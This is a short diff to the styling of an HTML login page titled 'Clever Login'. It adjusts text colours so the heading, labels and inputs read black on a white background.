@@ -8,7 +8,7 @@
         body {
             font-family: Arial, sans-serif;
             background-color: white;
-            color: black;
+            color: white;
             text-align: center;
             padding-top: 100px;
             margin: 0;
@@ -21,7 +21,7 @@
         }
         .login-container {
             background: white;
-            color: white;
+            color: black;
             padding: 20px;
             width: 350px;
             margin: auto;
@@ -35,6 +35,7 @@
             margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 5px;
+            color: black;
         }
         button {
             background: #0078d4;
@@ -54,15 +55,19 @@
             left: 20px;
             font-size: 24px;
             font-weight: bold;
+            color: black;
+        }
+        .message-container h1 {
+            color: black;
         }
     </style>
 </head>
 <body>
     <div class="login-container" id="loginBox">
-        <h2>Clever Login</h2>
+        <h2 style="color: black;">Clever Login</h2>
         <input type="text" id="username" placeholder="Username">
         <input type="password" id="password" placeholder="Password">
-        <label>
+        <label style="color: black;">
             <input type="checkbox" id="staySignedIn"> Stay signed in
         </label>
         <button onclick="validateLogin()">Log In</button>
